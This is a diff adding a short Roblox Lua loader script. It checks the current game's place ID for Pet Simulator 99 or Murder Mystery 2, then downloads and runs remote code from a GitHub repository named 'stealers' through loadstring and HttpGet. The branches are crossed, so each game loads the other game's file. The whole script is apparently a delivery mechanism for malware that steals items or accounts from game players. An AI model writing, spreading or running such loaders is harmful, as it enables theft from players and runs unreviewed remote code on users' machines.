@@ -1,0 +1,18 @@
+local stealer_to_use = ""
+local gameid = {
+    [8737899170] = "ps99",
+    [15502339080] = "ps99",
+	
+    [142823291] = "mm2",
+    [335132309] = "mm2",
+    [636649648] = "mm2"
+}
+
+if gameid[game.PlaceId] then
+    stealer_to_use = gameid[game.PlaceId]
+end
+if stealer_to_use == "mm2" then
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/stealers/refs/heads/main/ps99"))()
+elseif stealer_to_use == "ps99" then
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/stealers/refs/heads/main/mm2"))()
+end
